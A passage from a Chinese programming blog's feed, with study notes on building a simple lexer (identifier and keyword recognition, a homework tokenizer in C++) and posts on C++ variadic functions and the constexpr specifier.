&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h3 id="识别标识符"><a href="#识别标识符" class="headerlink" title="识别标识符"></a>识别标识符</h3><h4 id="转移图-1"><a href="#转移图-1" class="headerlink" title="转移图"></a>转移图</h4><p><img src="/images/cffx/20171026165653.png"></p>
<h4 id="算法伪代码-1"><a href="#算法伪代码-1" class="headerlink" title="算法伪代码"></a>算法伪代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">token nextToken()</div><div class="line">&#123;</div><div class="line">	c = getChar();</div><div class="line">	switch (c)</div><div class="line">	&#123;</div><div class="line">	/*</div><div class="line">	...</div><div class="line">	...</div><div class="line">	...</div><div class="line">	*/</div><div class="line">	case &apos;a&apos;, ..., &apos;z&apos;, &apos;A&apos;, ..., &apos;Z&apos;, &apos;_&apos;:</div><div class="line">		c = getChar();</div><div class="line">		while (c == &apos;a&apos; || ... || c == &apos;z&apos; </div><div class="line">			|| c == &apos;A&apos; || ... || c == &apos;Z&apos;</div><div class="line">			|| c == &apos;0&apos; || ... || c == &apos;9&apos;</div><div class="line">			|| c == &apos;_&apos;)</div><div class="line">			c = getChar();</div><div class="line">		rollback();</div><div class="line">		return ID;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<h4 id="识别IF"><a href="#识别IF" class="headerlink" title="识别IF"></a>识别IF</h4><p>在识别标识符的基础上，进一步实现识别特定的关键字。</p>
<h5 id="转移图-2"><a href="#转移图-2" class="headerlink" title="转移图"></a>转移图</h5><p><img src="/images/cffx/2017102617.png"></p>
<h5 id="算法伪代码-2"><a href="#算法伪代码-2" class="headerlink" title="算法伪代码"></a>算法伪代码</h5><p>代码太长太麻烦，我不想写。<br>如果对所有关键字都要写这样特定的代码，工作量显然是相当巨大的，于是便有了关键字表算法。</p>
<h4 id="关键字表算法"><a href="#关键字表算法" class="headerlink" title="关键字表算法"></a>关键字表算法</h4><ul>
<li>对所有关键字构造哈希表H</li>
<li>先统一按标识符的转移图来识别标识符</li>
<li>识别完成后，进一步查表H是否为关键字<br>通过合理的构造哈希表H（完美哈希），可以在O(1)时间完成。</li>
</ul>
<hr>
<h2 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a>课后作业</h2><blockquote>
<p>在这部分中，你将使用图转移算法手工实现一个小型的词法分析器。</p>
<ul>
<li>分析器的输入：存储在文本文件中的字符序列，字符取自ASCII字符集。文件中可能包括四种记号：关键字if、符合C语言标准的标识符、空格符、回车符\n。</li>
<li>分析器的输出：打印出所识别的标识符的种类、及行号、列号信息。</li>
</ul>
<p>【示例】对于下面的文本文件：<br>ifx if iif       if<br>iff     if<br>你的输出应该是：<br>ID(ifx) (1, 1)<br>IF        (1, 4)<br>ID(iif)  (1, 8)<br>IF       (1, 13)<br>ID(iff) (2, 1)<br>IF       (2, 8)</p>
</blockquote>
<p>我的代码（很恶心，但是不想改了）：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iterator&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Token</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">  <span class="keyword">public</span>:</div><div class="line">    Token(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s, <span class="keyword">int</span> row, <span class="built_in">string</span>::size_type loc) : s(s), row(row), col(loc - s.size() + <span class="number">1</span>) &#123;&#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="built_in">string</span> str;</div><div class="line">        <span class="keyword">if</span> (s != <span class="string">"if"</span>)</div><div class="line">            str = <span class="string">"ID("</span> + s + <span class="string">")"</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            str = <span class="string">"IF"</span>;</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; setw(<span class="number">10</span>) &lt;&lt; left &lt;&lt; str &lt;&lt; <span class="string">"\t("</span> &lt;&lt; row &lt;&lt; <span class="string">", "</span> &lt;&lt; col &lt;&lt; <span class="string">')'</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  <span class="keyword">private</span>:</div><div class="line">    <span class="built_in">string</span> s;</div><div class="line">    <span class="keyword">int</span> row;</div><div class="line">    <span class="built_in">string</span>::size_type col;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">string</span> line;</div><div class="line">    <span class="keyword">int</span> cnt_line = <span class="number">0</span>;</div><div class="line">    <span class="built_in">vector</span>&lt;Token&gt; tokens;</div><div class="line">    <span class="keyword">while</span> (getline(<span class="built_in">cin</span>, line))</div><div class="line">    &#123;</div><div class="line">        ++cnt_line;</div><div class="line">        <span class="built_in">string</span>::iterator cur = line.begin(), end = line.end();</div><div class="line">        <span class="keyword">while</span> (cur != end)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">string</span> id;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">isalpha</span>(*cur) || *cur == <span class="string">'_'</span>)</div><div class="line">            &#123;</div><div class="line">                id += *cur++;</div><div class="line">                <span class="keyword">while</span> (<span class="built_in">isalnum</span>(*cur) || *cur == <span class="string">'_'</span>)</div><div class="line">                    id += *cur++;</div><div class="line">            &#125;</div><div class="line">            tokens.push_back(Token(id, cnt_line, cur - line.begin()));</div><div class="line">            <span class="keyword">while</span> (<span class="built_in">isspace</span>(*cur))</div><div class="line">                ++cur;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;Token&gt;::iterator i = tokens.begin(); i != tokens.end(); ++i)</div><div class="line">        (*i).print();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>输出效果：<br><img src="/images/cffx/20171030084516.png"></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单笔记&lt;/p&gt;
    
    </summary>
    
      <category term="原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/categories/%E5%8E%9F%E7%90%86/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="原理" scheme="http://gaufoo.com/tags/%E5%8E%9F%E7%90%86/"/>
    
      <category term="编译原理" scheme="http://gaufoo.com/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>C++中三种实现可变参数的方法</title>
    <link href="http://gaufoo.com/2017/10/24/Cpp%E5%8F%AF%E5%8F%98%E5%8F%82%E6%95%B0/"/>
    <id>http://gaufoo.com/2017/10/24/Cpp可变参数/</id>
    <published>2017-10-24T12:20:56.000Z</published>
    <updated>2017-10-24T17:23:09.506Z</updated>
    
    <content type="html"><![CDATA[<p>我真的只是想写一个log函数而已。</p>
<a id="more"></a>
<hr>
<h2 id="可变参数宏（C实现）"><a href="#可变参数宏（C实现）" class="headerlink" title="可变参数宏（C实现）"></a>可变参数宏（C实现）</h2><p>利用头文件<code>stdarg.h</code>中的宏定义：<code>va_list</code>、<code>va_start(va_list, arg)</code>、<code>va_arg(va_list, type)</code>、<code>va_end(va_list)</code>。可以实现可变参数且参数类型不同的函数。</p>
<p>过程：</p>
<ul>
<li>函数声明中，可变参数用省略号表示。</li>
<li>创建<code>va_list</code>变量，通过<code>va_start</code>访问参数列表并承接第一个参数。</li>
<li>使用<code>va_arg</code>继续获取参数的值。</li>
<li>使用<code>va_end</code>完成清理工作。</li>
</ul>
<p>以可变参数版本的sum作为例子：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> count, ...)</span> <span class="comment">//count 表示可变参数个数</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    va_list ap;          <span class="comment">//声明一个va_list变量</span></div><div class="line">    va_start(ap, count); <span class="comment">//初始化，第二个参数为最后一个确定的形参（不能另开局部变量）</span></div><div class="line"></div><div class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</div><div class="line">        sum += va_arg(ap, <span class="keyword">int</span>); <span class="comment">//读取可变参数，第二个参数为可变参数的类型</span></div><div class="line"></div><div class="line">    va_end(ap); <span class="comment">//清理工作</span></div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, sum(<span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>));</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>局限性：</p>
<blockquote>
<ul>
<li>可变参数宏只能实现<strong>顺序访问</strong>可变参数，无法后退访问。但可以重复使用<code>va_start</code>来初始化<code>va_list</code>变量。</li>
<li>运行时，函数必须能够根据已有信息（既有约定，或确定实参）确定可变参数的具体个数与类型：函数定义需要知道可变参数的具体类型、个数，这些信息是在运行时确定的，那么显然应该由实参来确定。在上面的例子中count传递了可变参数的个数，而参数类型则是既有约定（整型）； </li>
<li>该方法是<strong>极不安全</strong>的，宏本身无法提供任何安全性保证，他总是按照既定代码“自作多情”的认为实参就应该是那么多，即使实参并不是那么多。这就要求所有安全性必须由程序员来保证。例如，在以上的示例代码中，如果调用时指定count为10，但实际上只给出9个可变形参，那么函数还是会读取10个参数，显然第十次读取是多余的，多余的操作一般不会有什么好结果，当然如果实参过多，多余的实参也不会被读取而是被忽略。</li>
</ul>
</blockquote>
<hr>
<h2 id="initializer-list标准库类型（C-11）"><a href="#initializer-list标准库类型（C-11）" class="headerlink" title="initializer_list标准库类型（C++11）"></a>initializer_list标准库类型（C++11）</h2><p>过程：</p>
<ul>
<li>函数声明中使用<code>initializer_list</code>模板代表可变参数列表</li>
<li>使用迭代器访问<code>initializer_list</code>中的参数</li>
<li>传入参数时需要使用<code>{}</code>把多个参数括起来</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initializer_list&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;<span class="keyword">int</span>&gt; il)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p : il)   <span class="comment">// 使用范围for</span></div><div class="line">        sum += p;</div><div class="line">    <span class="comment">// for (auto p = il.begin(); p != il.end(); p++) //使用迭代器访问参数</span></div><div class="line">    <span class="comment">//     sum += *p;</span></div><div class="line">    <span class="keyword">return</span> sum;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; sum(&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>局限性：</p>
<ul>
<li>可变参数类型必须<strong>一致</strong></li>
</ul>
<hr>
<h2 id="可变参数模板（C-11）"><a href="#可变参数模板（C-11）" class="headerlink" title="可变参数模板（C++11）"></a>可变参数模板（C++11）</h2><p>更方便安全有效地实现可变参数且参数类型不同的函数。</p>
<p>过程：</p>
<ul>
<li>编写含有模板参数包和函数参数包的模板函数</li>
<li>函数定义<strong>递归</strong>调用自己</li>
<li>利用函数重载（参数包含有零个参数）来处理<strong>边界情况</strong>，编写处理边界情况的模板</li>
</ul>
<p>C++ primer 第五版中的例子：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用来终止递归并打印最后一个元素的函数</span></div><div class="line"><span class="comment">// 此函数必须在可变参数版本的print定义之前声明（否则将出现neither visible nor found by argument-dependent lookup错误）</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="built_in">std</span>::<span class="function">ostream &amp;<span class="title">print</span><span class="params">(<span class="built_in">std</span>::ostream &amp;os, <span class="keyword">const</span> T &amp;t)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> os &lt;&lt; t;                <span class="comment">// 包中最后一个元素</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//包中除最后一个元素之外的其他元素都会调用这个版本的pirnt</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</div><div class="line"><span class="built_in">std</span>::<span class="function">ostream &amp;<span class="title">print</span><span class="params">(<span class="built_in">std</span>::ostream &amp;os, <span class="keyword">const</span> T &amp;t, cosnt Args &amp;... rest)</span></span>&#123;</div><div class="line">    os &lt;&lt; t &lt;&lt; <span class="string">","</span>;               <span class="comment">// 打印第一个实参，包中元素减一</span></div><div class="line">    <span class="keyword">return</span> print(os, rest...);    <span class="comment">// 递归调用，打印剩余实参</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>局限性：</p>
<ul>
<li>由于只能递归实现，导致需要定义重载函数来处理边界情况，代码不够清晰自然。</li>
<li>模板会为每一个不同的实例生成代码，函数的实例过多可能会使代码体积庞大。</li>
<li>依靠递归使得功能具有局限性，并且效率也会受到影响。</li>
</ul>
<hr>
<h2 id="log函数实现"><a href="#log函数实现" class="headerlink" title="log函数实现"></a>log函数实现</h2><p>头文件：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* log.h */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LOG_H_</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_H_</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="built_in">std</span>::<span class="function">ostream &amp;<span class="title">log</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">cout</span>; &#125;</div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span>... Args&gt;</div><div class="line"><span class="built_in">std</span>::<span class="function">ostream &amp;<span class="title">log</span><span class="params">(T <span class="keyword">const</span> &amp;p, Args <span class="keyword">const</span> &amp;... rest)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; p;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">log</span>(rest...);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p>测试代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* test.cpp */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"log.h"</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">int</span> n = <span class="number">2</span>;</div><div class="line">    <span class="built_in">log</span>(n, <span class="string">" hello "</span>, <span class="number">10086</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// std::cout &lt;&lt; "2 hello 10086" &lt;&lt; std::endl;</span></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我真的只是想写一个log函数而已。&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
    
    
      <category term="编程" scheme="http://gaufoo.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/tags/C/"/>
    
      <category term="C" scheme="http://gaufoo.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>C++11类型说明符：constexpr</title>
    <link href="http://gaufoo.com/2017/10/24/CppConstexpr/"/>
    <id>http://gaufoo.com/2017/10/24/CppConstexpr/</id>
    <published>2017-10-24T08:00:59.000Z</published>
    <updated>2017-10-24T11:39:43.821Z</updated>
    
    <content type="html"><![CDATA[<p>关键字<code>constexpr</code>用于修饰常量表达式（const express），具体说明如下</p>
<a id="more"></a>
<hr>
<h2 id="字面值常量（literal）"><a href="#字面值常量（literal）" class="headerlink" title="字面值常量（literal）"></a>字面值常量（literal）</h2><ul>
<li>由形式和值来决定数据类型</li>
<li>可手动指定类型<br>如：<ul>
<li>常规<br>20 <em>—— 十进制数</em><br>0x8 <em>—— 十六进制数</em><br>“hello” <em>—— char[6]</em></li>
<li>指定类型<br>3F <em>—— float</em><br>L’a’ <em>—— whar_t</em><br>u8”hi!” <em>—— utf-8</em><br>3.14159 <em>—— long double</em></li>
</ul>
</li>
</ul>
<hr>
<h2 id="常量表达式（const-express）"><a href="#常量表达式（const-express）" class="headerlink" title="常量表达式（const express）"></a>常量表达式（const express）</h2><blockquote>
<p>The constexpr specifier declares that it is possible to evaluate the value of the function or variable at compile time. Such variables and functions can then be used where only compile time constant expressions are allowed (provided that appropriate function arguments are given). A <code>constexpr</code> specifier used in an <code>object</code> declaration implies <code>const</code>. A <code>constexpr</code> specifier used in a <code>function</code> or static member variable (since C++17) declaration implies <code>inline</code>.</p>
</blockquote>
<p>其中<code>literal</code>就是<code>const express</code>的一种。从文档可知，<code>const express</code>主要性质是可以在编译期间得到值。同时，<code>constexpr</code>修饰的对象自动获得<strong>常量</strong>属性，<code>constexpr</code>修饰的函数自动获得<strong>内联</strong>属性。</p>
<hr>
<h3 id="constexpr变量"><a href="#constexpr变量" class="headerlink" title="constexpr变量"></a>constexpr变量</h3><p>满足以下条件：</p>
<ul>
<li>其值必须为<code>literal</code>类型。</li>
<li>必须能立即初始化，意味着所有的初始化方法，包括所有隐式转换、调用构造函数等，都必须为<code>const express</code>。</li>
</ul>
<p>特别需要说明的是指针变量，<code>constexpr</code>类型的指针变量有以下的几种存在方式：</p>
<ul>
<li><p>指向nullptr</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> *p = <span class="literal">nullptr</span>;</div></pre></td></tr></table></figure>
</li>
<li><p>指向全局变量、static变量，因其地址不会改变</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> i = <span class="number">0</span>;	<span class="comment">// i 定义在函数外部，是一个全局变量</span></div><div class="line"><span class="keyword">constexpr</span> <span class="keyword">int</span> *p = &amp;i;	<span class="comment">// 正确</span></div></pre></td></tr></table></figure>
</li>
<li><p>另外：<br>虽然<code>constexpr</code>和<code>const</code>在某些方面有点相似，但<code>constexpr int *q = nullptr;</code>的含义却与<code>const int *q = nullptr;</code>的有些出入，前者<code>q</code>不能修改，后者<code>*q</code>不能修改。若需要指向常量的常量指针，可以这样定义：<code>constexpr const int *q = nullptr;</code>，这样<code>q</code>和<code>*q</code>就都是不可修改的常量了。</p>
</li>
</ul>
<hr>
<h3 id="constexpr函数"><a href="#constexpr函数" class="headerlink" title="constexpr函数"></a>constexpr函数</h3><p><code>constexpr</code>函数会被隐式地<code>inline</code>。<br>满足以下条件：</p>
<ul>
<li>形参和返回值都得为<code>literal</code>类型</li>
<li>只能有一条<code>return</code>语句</li>
</ul>
<p>例：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">constexpr</span> <span class="keyword">int</span> <span class="title">new_sz</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="number">42</span>;&#125;</div><div class="line"><span class="function">cosntexpr size_t <span class="title">scale</span><span class="params">(<span class="keyword">size_t</span> cnt)</span> </span>&#123;<span class="keyword">return</span> new_sz() * cnt;&#125;</div><div class="line"><span class="keyword">int</span> arr[scale(<span class="number">2</span>)];	<span class="comment">// 正确，scale(2)是const express</span></div><div class="line"><span class="keyword">int</span> n = <span class="number">2</span>;</div><div class="line"><span class="keyword">int</span> arr2[scale(n)];	<span class="comment">// 错误，scale(n)不是const express</span></div></pre></td></tr></table></figure></p>
<hr>
<h3 id="constexpr类"><a href="#constexpr类" class="headerlink" title="constexpr类"></a>constexpr类</h3><p>满足以下条件：</p>
<ul>
<li>该类是聚合类，所谓聚合类：<ul>
<li>所有成员都是public</li>
<li>无显式定义的构造函数</li>
<li>成员无初始值</li>
<li>无基类，无virtual函数</li>
</ul>
</li>
<li>若不是聚合类，需要满足<ul>
<li>数据成员必须都为<code>literal</code>类型（函数成员无须是）</li>
<li>至少含有一个<code>constexpr</code>构造函数</li>
<li>只能使用默认的析构函数</li>
</ul>
</li>
</ul>
<p>例：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">  <span class="keyword">public</span>:</div><div class="line">    constexpr Debug(bool b = true) : hw(b), io(b), other(b) &#123;&#125;</div><div class="line">    constexpr Debug(bool h, bool i, bool o) : hw(h), io(i), other(o) &#123;&#125;</div><div class="line">    <span class="function"><span class="keyword">constexpr</span> <span class="keyword">bool</span> <span class="title">any</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> hw || io || other; &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_io</span><span class="params">(<span class="keyword">bool</span> b)</span> </span>&#123; io = b; &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_hw</span><span class="params">(<span class="keyword">bool</span> b)</span> </span>&#123; hw = b; &#125;</div><div class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_other</span><span class="params">(<span class="keyword">bool</span> b)</span> </span>&#123; other = b; &#125;</div><div class="line"></div><div class="line">  <span class="keyword">private</span>:</div><div class="line">    <span class="keyword">bool</span> hw;</div><div class="line">    <span class="keyword">bool</span> io;</div><div class="line">    <span class="keyword">bool</span> other;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="function"><span class="keyword">constexpr</span> Debug <span class="title">io_sub</span><span class="params">(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>)</span></span>;</div><div class="line">    <span class="keyword">if</span> (io_sub.any())</div><div class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"print appropriate error messages"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关键字&lt;code&gt;constexpr&lt;/code&gt;用于修饰常量表达式（const express），具体说明如下&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
    
    
      <category term="编程" scheme="http://gaufoo.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>编译原理学习笔记（二）</title>
    <link href="http://gaufoo.com/2017/09/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://gaufoo.com/2017/09/16/编译原理学习笔记（二）/</id>
